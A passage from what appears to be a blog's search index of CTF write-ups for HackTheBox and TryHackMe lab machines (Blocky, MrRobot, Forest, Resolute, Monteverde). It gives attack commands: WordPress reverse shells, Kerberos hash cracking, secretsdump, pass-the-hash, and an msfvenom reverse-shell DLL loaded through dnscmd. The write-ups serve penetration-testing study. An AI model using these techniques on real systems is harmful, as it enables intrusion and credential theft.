(Aggressive Detection)  [+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)   Doing a little bit of more ennumeration, something strange comes in place of PLUGINS directory.      Enumerating a bit more deeper   Download both files and we’ll use a java decompiler such as jad to view the contents of the files.   I use JD-Gui to be decompile the java files.      As the username and password are found let’s login via SSH   sh notch@10.10.10.37 notch@10.10.10.37's password: 8YsqfCTnvxAUeduzjNSXe22  #Check what we can do with the account notch@Blocky:~$    Getting User.txt   notch@Blocky:~$ cat user.txt  5************************   Getting Root.txt   notch@Blocky:~$ sudo -l [sudo] password for notch:  Matching Defaults entries for notch on Blocky:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User notch may run the following commands on Blocky:     (ALL : ALL) ALL   As the user has permission to ALL we can run sudo -i to get ROOT.   notch@Blocky:~$ sudo -i  root@Blocky:~# cat root.txt  0************************   ","categories": ["hackthebox"],
        "tags": ["linux,","gobuster"],
        "url": "/hackthebox/Blocky/",
        "teaser": "/assets/img/sample/blocky.png"
      },{
        "title": "Tryhackme MrRobot",
        "excerpt":"Let’s get started   As always hacking starts with NMAP scan.   PORT    STATE  SERVICE VERSION 22/tcp  closed ssh 80/tcp  open   http    Apache httpd |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). 443/tcp open   ssl/ssl Apache httpd (SSL-only mode) |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after:  2025-09-13T10:45:03  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.91 seconds  Key 1-3   As we can see port 80 is opened, the first thing I always do before running tools such as nikto or gobuster is to look for known pages such as robots.txt.      From the above image we can see that there is fsocity.dsc which contains a lot of Passwords. So download and save it.   We got one of the keys!      Using the help of WP-Scan I was able to find the username and pass as:      wpscan –url http://[Ip_address] -U elliot -P fsocity.dic    +----+--------+------+-----------+ | Id | Login  | Name | Password  | +----+--------+------+-----------+ |    | elliot |      | ER28-0652 | +----+--------+------+-----------+   Now let’s go to the wp-login page and try to login.      Now from here what we need to do is get a shell   This can be done very easily by editing a .php that is available already in the wordpress site and adding a reverse shell   Click on Appearence →Editor →[Choose any php file in my case i’ll choose 404.php]      After saving the php file, I went to my local shell in Kali and set up a listener:      nc -lvp 5566    Once the listner is set to ON, it’s time to trigger the 404 page. If all done correctly we should be having the shell by now!   Key 2-3  nc -lvp 5566                                                                                                                                              root@kali Ncat: Version 7.70 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.0.0.58. Ncat: Connection from 10.0.0.58:47047. Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux 16:34:06 up  1:29,  0 users,  load average: 0.00, 0.01, 0.05 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT uid=1(daemon) gid=1(daemon) groups=1(daemon) /bin/sh: 0: can't access tty; job control turned off $      $python -c ‘import pty; pty.spawn(“/bin/bash”)’ to get the proper shell    $ python -c 'import pty; pty.spawn(\"/bin/bash\")' daemon@linux:/$   At this point, I spent a lot of time fishing around the htdocs directory, but found nothing. So I headed to the/home/ directory, where there was a single home directory for a user named robot; which included the second key!   daemon@linux:/$ cd home/   daemon@linux:/home$ ls robot daemon@linux:/home$ cd robot/ daemon@linux:/home/robot$ ls key-2-of-3.txt\tpassword.raw-md5 daemon@linux:/home/robot$ cat password.raw-md5  robot:c3fcd3d76192e4007dfb496cca67e13b daemon@linux:/home/robot$   robot:c3fcd3d76192e4007dfb496cca67e13b   This looks like a username and hash pair.   Googling for “md5 cracker” gives a load of sites which will take the md5 hash and through pre-computed tables tell us what it was originally.      After cracking the hash we come to see the password as abcdefghijklmnopqrstuvwxyz    daemon@linux:/home/robot$ su -l robot Password:  $ ls key-2-of-3.txt\tpassword.raw-md5 $ whoami  robot   At this point we can grab key-2-of-3.txt   robot@linux:~$ cat key-2-of-3.txt cat key-2-of-3.txt 822c73956184f694993bede3eb39f959  Getting Root.txt   Final step getting root on the machine   key 3-3   robot@linux:~$ nmap --interactive nmap --interactive Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h &lt;enter&gt; for help nmap&gt; !sh !sh # ls ls key-2-of-3.txt  password.raw-md5 # cd /root cd /root # ls ls firstboot_done  key-3-of-3.txt # cat key-3-of-3.txt cat key-3-of-3.txt 04787ddef27c3dee1ee161b21670b4e4   If you like my work, please do consider giving me +rep on HACKTHEBOX.  My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968   ","categories": ["tryhackme"],
        "tags": ["linux,","gobuster,","wordpress,","boot2root"],
        "url": "/tryhackme/Mrrobot/",
        "teaser": "/assets/img/sample/mrrobot/mr.robot.jpg"
      },{
        "title": "Kali-Linux-Tools",
        "excerpt":"Kali Tools    Visit Kali_tools   Installs all the required Kali Linux tools on almost any Linux distributions.   Helpful for those who change their Linux distribution   Requires Python 2.7   Easy to install       INSTALLATION    Install git (sudo apt install git)   git clone https://github.com/jeevanachandra/kali-tools.git sudo ./kali-tools.py   Install what you needed     ","categories": ["otherposts"],
        "tags": ["linux,","Tools,","Selftools"],
        "url": "/otherposts/Kali-Linux-Tools/",
        "teaser": "/assets/img/sample/kali-tools.png"
      },{
        "title": "HackTheBox Forest",
        "excerpt":"As always hacking starts with NMAP scan.   Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:22 EDT Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.031s latency). Not shown: 64742 closed ports, 769 filtered ports PORT      STATE SERVICE 53/tcp    open  domain 88/tcp    open  kerberos-sec 135/tcp   open  msrpc 139/tcp   open  netbios-ssn 389/tcp   open  ldap 445/tcp   open  microsoft-ds 464/tcp   open  kpasswd5 593/tcp   open  http-rpc-epmap 636/tcp   open  ldapssl 3268/tcp  open  globalcatLDAP 3269/tcp  open  globalcatLDAPssl 5985/tcp  open  wsman 9389/tcp  open  adws 47001/tcp open  winrm 49664/tcp open  unknown 49665/tcp open  unknown 49666/tcp open  unknown 49667/tcp open  unknown 49669/tcp open  unknown 49670/tcp open  unknown 49671/tcp open  unknown 49678/tcp open  unknown 49697/tcp open  unknown 49898/tcp open  unknown  Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds  root@kali# nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:24 EDT Nmap scan report for 10.10.10.161 Host is up (0.030s latency).  PORT     STATE SERVICE      VERSION 53/tcp   open  domain? | fingerprint-strings:  |   DNSVersionBindReqTCP:  |     version |_    bind 88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-14 18:32:33Z) 135/tcp  open  msrpc        Microsoft Windows RPC 139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn 389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp  open  kpasswd5? 593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0 636/tcp  open  tcpwrapped 3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open  tcpwrapped 5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open  mc-nmf       .NET Message Framing 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=10/14%Time=5DA4BD82%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03\"); Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: |_clock-skew: mean: 2h27m32s, deviation: 4h02m30s, median: 7m31s | smb-os-discovery:  |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) |   Computer name: FOREST |   NetBIOS computer name: FOREST\\x00 |   Domain name: htb.local |   Forest name: htb.local |   FQDN: FOREST.htb.local |_  System time: 2019-10-14T11:34:51-07:00 | smb-security-mode:  |   account_used: &lt;blank&gt; |   authentication_level: user |   challenge_response: supported |_  message_signing: required | smb2-security-mode:  |   2.02:  |_    Message signing enabled and required | smb2-time:  |   date: 2019-10-14T18:34:52 |_  start_date: 2019-10-14T09:52:45  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 281.19 seconds  root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.161 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:30 EDT Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.091s latency). Not shown: 65457 open|filtered ports, 74 closed ports PORT      STATE SERVICE 123/udp   open  ntp 389/udp   open  ldap 58399/udp open  unknown 58507/udp open  unknown  Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds   Finding Users in the domain   I used RPCCLIENT to find the users in the domain   #rpcclient 10.10.10.161 -U% rpcclient $&gt; enumdom enumdomains    enumdomgroups  enumdomusers    rpcclient $&gt; enumdomusers  user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325456bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox6ded678] rid:[0x473] user:[HealthMailbox83d6781] rid:[0x474] user:[HealthMailboxfd87238] rid:[0x475] user:[HealthMailboxb01ac64] rid:[0x476] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480]   Getting TGT  Getting the TGT from the list of users found from RPCCLIENT using IMPACKET SCRIPTS.      python GetNPUsers.py -no-pass -k -dc-ip 10.10.10.161 htb.local/svc-alfresco    There are a bunch of ways to use impacket-scripts, so we can use the below options as well.   Options:  htb.local - is the domain name we extracted from the nmap output -usersfile - the list of users we want to test aginst // we extracted from enum4linux output -format hashcat - tells the tool to set the hash (if exists) to hashcat format so we crank it easilt -outputfile - the place to put the output in -dc-ip - the domain controller IP address   we get the hash of the user SVC-alfresco      $krb5asrep$23$svc-alfresco@HTB.LOCAL:14c0bc63892470b5a2246ad5456d61f8$11340938cc2f5070bce088816b5a70abb614dcceeaafb99e59788bb288b0b3ad0231b46ec4603d9ebac192028e8d7ac1042cedc80d38c048ba2e8a881f26c0d94d267a52cc59194f4c7b08bef5256198f73e3e9a60c3aa6f92623c12e0b7c4a425edbfbe72561eb97142c8853dea7f532589e7e03d61bbccddaff66bad8d4e1039384ceb364c9d95c1a6828fc9eb232a176f44c44844eed8d9eecf208e22617a46ee61881f9bfda2ab3b67428a43d76798299cda3de9b279b88e8d34e40ab62846252050d6c48870527f1208bf1fb67f17452b0813358c8cefb0df724ce323ba39e212065cbb    Cracking the hash   Now it’s time to crack the hash of the user SVC-alfresco      hashcat -m18200 hash.txt /usr/share/wordlists/rockyou.txt       $krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:s3rvice    As the password is found, I proceed with using Evil-Winrm to gain the foothold of the machine   Getting User.txt   evil-winrm -i forest.htb -u svc-alfresco -p s3rvice Info: Starting Evil-WinRM shell v1.7 Info: Establishing connection to remote endpoint                                                          *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt;  *Evil-WinRM* PS C:\\Users\\svc-alfresco\\desktop&gt; type user.txt [e*******************************]   privileges Escalation   From svc-alfresco to Administrator   Using bloodhound to find some intresting stuff      BloodHound Result Shows Svc-Alfresco can WriteDacl to HTB.local that Contains administrator@htb.local.   Useful link for priv esc      https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/    No it’s time to abuse the AD…      net group “Exchange Windows Permissions” svc-alfresco /add /domain       python3 secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161    Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation  [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied  [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::   So as we found the hash of the Administrator of the domain, we can now use Pass the hash to gain the Shell of Administrator.   Getting Root.txt   evil-winrm -i forest.htb -u Administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6  Info: Starting Evil-WinRM shell v1.7  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami htb\\administrator C:\\users\\administrator\\desktop&gt;type root.txt [f*******************************]   If you like my work, please do consider giving me +rep on HACKTHEBOX.  My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968   ","categories": ["hackthebox"],
        "tags": ["windows,","activedirectory,","impacket,","evilwinrm,","bloodhound,","rpcclient"],
        "url": "/hackthebox/Forest/",
        "teaser": "/assets/img/sample/forest.png"
      },{
        "title": "HackTheBox Resolute",
        "excerpt":"Let’s get started   As always hacking starts with NMAP scan.   resolute nmap -sC -sV -p- -v -oA scans/nmap-full -T4 resolute.htb Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-29 09:31 EDT NSE: Loaded 148 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 09:31 Completed NSE at 09:31, 0.00s elapsed Initiating NSE at 09:31 Completed NSE at 09:31, 0.00s elapsed Initiating Ping Scan at 09:31 Scanning resolute.htb (10.10.10.169) [4 ports] Completed Ping Scan at 09:31, 0.59s elapsed (1 total hosts) Initiating SYN Stealth Scan at 09:31 Scanning resolute.htb (10.10.10.169) [65535 ports] Discovered open port 445/tcp on 10.10.10.169 Discovered open port 139/tcp on 10.10.10.169 Discovered open port 135/tcp on 10.10.10.169 Discovered open port 53/tcp on 10.10.10.169 Discovered open port 49677/tcp on 10.10.10.169 NSE: Script scanning 10.10.10.169. Initiating NSE at 09:52 Completed NSE at 09:54, 121.80s elapsed Initiating NSE at 09:54 Completed NSE at 09:54, 1.93s elapsed Nmap scan report for resolute.htb (10.10.10.169) Host is up (0.36s latency). Not shown: 65510 closed ports PORT      STATE SERVICE      VERSION 53/tcp    open  domain? | fingerprint-strings: |   DNSVersionBindReqTCP: |     version |_    bind 88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-29 04:29:54Z) 135/tcp   open  msrpc        Microsoft Windows RPC 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn 389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) 464/tcp   open  kpasswd5? 593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0 636/tcp   open  tcpwrapped 3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 3269/tcp  open  tcpwrapped 5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp  open  mc-nmf       .NET Message Framing 47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open  msrpc        Microsoft Windows RPC 49665/tcp open  msrpc        Microsoft Windows RPC 49666/tcp open  msrpc        Microsoft Windows RPC 49667/tcp open  msrpc        Microsoft Windows RPC 49670/tcp open  msrpc        Microsoft Windows RPC 49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0 49677/tcp open  msrpc        Microsoft Windows RPC 49684/tcp open  msrpc        Microsoft Windows RPC 49712/tcp open  msrpc        Microsoft Windows RPC 64798/tcp open  tcpwrapped 64974/tcp open  tcpwrapped 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=5/29%Time=5ED11327%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\"); Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -7h00m31s, deviation: 4h02m32s, median: -9h20m33s | smb-os-discovery: |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) |   Computer name: Resolute |   NetBIOS computer name: RESOLUTE\\x00 |   Domain name: megabank.local |   Forest name: megabank.local |   FQDN: Resolute.megabank.local |_  System time: 2020-05-28T21:32:12-07:00 | smb-security-mode: |   account_used: guest |   authentication_level: user |   challenge_response: supported |_  message_signing: required | smb2-security-mode: |   2.02: |_    Message signing enabled and required | smb2-time: |   date: 2020-05-29 00:32:10 |_  start_date: 2020-05-28 18:33:16  NSE: Script Post-scanning. Initiating NSE at 09:54 Completed NSE at 09:54, 0.00s elapsed Initiating NSE at 09:54 Completed NSE at 09:54, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1372.93 seconds Raw packets sent: 72795 (3.203MB) | Rcvd: 69585 (2.784MB)   Using Enum4linux as the next step:   Enum4linux   Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat May 30 07:44:42 2020 ==========================  |    Target Information    | ==========================  Target ........... resolute.htb RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ====================================================  |    Enumerating Workgroup/Domain on resolute.htb    | ====================================================  [E] Cant find workgroup/domain ============================================  |    Nbtstat Information for resolute.htb    | ============================================              Unknown parameter encountered: \"winbind trusted domains only\" Ignoring unknown parameter \"winbind trusted domains only\" Looking up status of 10.10.10.169 No reply from 10.10.10.169                      UserList   user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[ryan] rid:[0x451] user:[marko] rid:[0x457] user:[sunita] rid:[0x19c9] user:[abigail] rid:[0x19ca] user:[marcus] rid:[0x19cb] user:[sally] rid:[0x19cc] user:[fred] rid:[0x19cd] user:[angela] rid:[0x19ce] user:[felicia] rid:[0x19cf] user:[gustavo] rid:[0x19d0] user:[ulf] rid:[0x19d1] user:[stevie] rid:[0x19d2] user:[claire] rid:[0x19d3] user:[paulo] rid:[0x19d4] user:[steve] rid:[0x19d5] user:[annette] rid:[0x19d6] user:[annika] rid:[0x19d7] user:[per] rid:[0x19d8] user:[claude] rid:[0x19d9] user:[melanie] rid:[0x2775] user:[zach] rid:[0x2776] user:[simon] rid:[0x2777] user:[naoki] rid:[0x2778]   something useful   =============================  |    Users on resolute.htb    | =============================  index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko\t Name: Marko Novak Desc: Account created. Password set to Welcome123!   Getting the User   So i used evil-winrm using user marko and pass Welcome123!  Which returned nothing…   So I treid the same password with all the users that I’ve found with the help of crackmapexe….  Which returned this  Username and password melanie:Welcome123!   Again with the help of EVIL-WINRM I was able to login and get the USER.txt….   evil-winrm -u melanie -p Welcome123! -i 10.10.10.169   Diggin in a little bit more deeper and searching for all the hidden files and directories, I found this..   cd / dir -force cd PSTranscripts cd 20191203 cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt   This Powershell script will reveal the password of the other user on the domain,  ryan : Serv3r4Admin4cc123!  Immediately jumping into Evil-Winrm and using Ryan credentials, got the shell of Ryan.   evil-winrm -u ryan -p Serv3r4Admin4cc123! -i 10.10.10.169    Privlilege Escalation   Exploring the directories of ryan, found note.txt. Which says  “Email to team: - due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute”  Finding out the permissions of Ryan   C:\\Users\\ryan\\Desktop&gt; whoami /all  USER INFORMATION ---------------- User Name     SID ============= ============================================== megabank\\ryan S-1-5-21-1392959593-3013219662-3596683436-1105 GROUP INFORMATION ----------------- Group Name                                 Type             SID                                             ========================================== ================ ==============================================  Everyone                                   Well-known group S-1-1-0                                         BUILTIN\\Users                              Alias            S-1-5-32-545                                    BUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                    BUILTIN\\Remote Management Users            Alias            S-1-5-32-580                                    NT AUTHORITY\\NETWORK                       Well-known group S-1-5-2                                         NT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11                                        NT AUTHORITY\\This Organization             Well-known group S-1-5-15                                        MEGABANK\\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103  MEGABANK\\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101  NT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10                                     Mandatory Label\\Medium Mandatory Level     Label            S-1-16-8192 PRIVILEGES INFORMATION ---------------------- Privilege Name                Description                    State ============================= ============================== ======= SeMachineAccountPrivilege     Add workstations to domain     Enabled SeChangeNotifyPrivilege       Bypass traverse checking       Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled. C:\\Users\\ryan\\Desktop&gt; whoami /all USER INFORMATION ---------------- User Name     SID ============= ============================================== megabank\\ryan S-1-5-21-1392959593-3013219662-3596683436-1105 GROUP INFORMATION ----------------- Group Name                                 Type             SID      ========================================== ================ ==============================================  Everyone                                   Well-known group S-1-1-0                                         BUILTIN\\Users                              Alias            S-1-5-32-545                                    BUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                    BUILTIN\\Remote Management Users            Alias            S-1-5-32-580                                    NT AUTHORITY\\NETWORK                       Well-known group S-1-5-2                                         NT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11                                        NT AUTHORITY\\This Organization             Well-known group S-1-5-15                                        MEGABANK\\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103  MEGABANK\\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101  NT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10                                     Mandatory Label\\Medium Mandatory Level     Label            S-1-16-8192 PRIVILEGES INFORMATION ---------------------- Privilege Name                Description                    State ============================= ============================== ======= SeMachineAccountPrivilege     Add workstations to domain     Enabled SeChangeNotifyPrivilege       Bypass traverse checking       Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled.   Seeing that Ryan is a member of DNSAdmins of Megabank.local, we can escalate our privileges from DNS admin to administrator.   This is the link that helped me…   https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise     Quickly generating a msfpayload and uploading the file.       msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=tun0 lport=3333 -f dll &gt; plugin.dll   uploading the file using impacket script.       ./smbserver.py -smb2support jeevan /home/stuxnet`    start the msfconsole and setup the listener.       &gt; msfconsole      &gt; use multi/handler      &gt; set payload windows/x64/meterpreter/reverse_tcp      &gt; set lhost tun0      &gt; set lport 3333      &gt; exploit   now the first command is to run the .dll file and the second and third commands are to stop and start the service respectively.       C:\\Users\\ryan\\Desktop&gt; dnscmd.exe /config /serverlevelplugindll \\\\10.10.14.47\\jeevan\\plugin.dll      sc.exe stop dns      sc.exe start dns    And we get the shell as administrator      If you like my work, please do consider giving me +rep on HACKTHEBOX.   My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968  ","categories": ["hackthebox"],
        "tags": ["windows,","activedirectory,","evilwinrm,","hashcat,","impacket"],
        "url": "/hackthebox/Resolute/",
        "teaser": "/assets/img/sample/res.png"
      },{
        "title": "HackTheBox Monteverde",
        "excerpt":"$tarting with NMAP Scan to see which ports are open.       Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 01:39 EDT     Nmap scan report for monteverde.htb (10.10.10.172)     Host is up (0.35s latency).     Not shown: 989 filtered ports     PORT     STATE SERVICE       VERSION     53/tcp   open  domain?     | fingerprint-strings:      |   DNSVersionBindReqTCP:      |     version     |_    bind     88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-12 04:53:41Z)     135/tcp  open  msrpc         Microsoft Windows RPC     139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn     389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)     445/tcp  open  microsoft-ds?     464/tcp  open  kpasswd5?     593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0     636/tcp  open  tcpwrapped     3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)     3269/tcp open  tcpwrapped     1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :     SF-Port53-TCP:V=7.80%I=7%D=6/12%Time=5EE31533%P=x86_64-pc-linux-gnu%r(DNSV     SF:ersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\     SF:x04bind\\0\\0\\x10\\0\\x03\");     Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows      Host script results:     |_clock-skew: -46m18s     | smb2-security-mode:      |   2.02:      |_    Message signing enabled and required     | smb2-time:      |   date: 2020-06-12T04:56:07     |_  start_date: N/A     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .     Nmap done: 1 IP address (1 host up) scanned in 333.84 seconds`    Enum4linux as the next step if I can see any user names and some juicy information.       ENUM4LINUX:     ===============================      |    Users on monteverde.htb    |     ===============================      Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.     index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.     index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)     index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain     index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)     index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)     index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)     index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)     index: 0xfc6 RID: 